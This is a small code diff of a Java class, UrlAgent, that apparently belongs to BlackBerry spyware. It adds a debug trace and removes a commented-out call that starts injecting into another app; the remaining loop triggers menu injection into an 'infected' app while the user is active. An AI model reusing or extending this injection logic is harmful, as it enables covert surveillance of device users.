@@ -106,6 +106,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
+        //#ifdef DEBUG
+        debug.trace("actualRun");
+        //#endif
+        
         if (appInjector.isInfected() && Backlight.isEnabled()
                 && isAppForeground) {
             //#ifdef DEBUG
@@ -114,12 +118,6 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
             appInjector.callMenuInContext();
         }
-
-/*        if (!appInjector.isInfected() && infecting == false) {
-            infecting = true;
-            menuInject();
-        }
-*/
     }
 
     /*
